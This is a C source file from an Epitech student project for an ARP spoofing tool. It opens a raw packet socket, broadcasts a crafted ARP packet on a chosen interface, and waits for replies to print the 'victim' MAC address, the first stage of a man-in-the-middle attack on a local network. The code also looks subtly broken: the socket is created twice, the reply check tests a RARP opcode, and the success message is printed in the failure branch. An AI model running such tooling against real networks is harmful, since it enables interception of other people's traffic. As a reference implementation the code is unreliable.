/*
** EPITECH PROJECT, 2022
** NWP_myarpspoof_2018
** File description:
** Created by lucasg,
*/

#include <net/if.h>
#include "arp.h"

int main(int ac, char **av)
{
    params_t *params = parse(ac, av);
    int _socket = create_socket();
    arp_hdr_t *arp = create_arp_paquet(params, _socket);
    uint8_t *packet = create_sendable_packets(arp);

    struct sockaddr_ll sock;

    sock.sll_family = AF_PACKET;
    sock.sll_hatype = ARPHRD_ETHER;
    sock.sll_protocol = htons(ETH_P_ARP);
    sock.sll_pkttype = IFF_BROADCAST;
    sock.sll_ifindex = if_nametoindex(params->interface);

    _socket = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

    sendto(_socket, packet, PACKET_LEN, 0, (const struct sockaddr *) &sock, sizeof(sock));

    printf("ARP packet sent\n");

    uint8_t *recvpacket = malloc(sizeof(uint8_t) * IP_MAXPACKET);
    arp_hdr_t *arp_hdr = (arp_hdr_t *)(recvpacket + PACKET_LEN);

    while (true) {
        recv(_socket, recvpacket, IP_MAXPACKET, 0);
        if (ntohs(arp_hdr->opcode) == ARPOP_RREPLY)
            break;
        else {
            printf ("\nVictim mac address received:\n");
            for (int i=0; i<6; i++)
                printf ("%02x:", recvpacket[i + 6]);
            memset(recvpacket, 0, IP_MAXPACKET);
            printf("Received wrong ARP, trying again...\n");
        }
    }
    printf ("\nVictim mac address received:\n");
    for (int i=0; i<6; i++)
        printf ("%02x:", recvpacket[i + 6]);


    delete_params(params);
    return 0;
}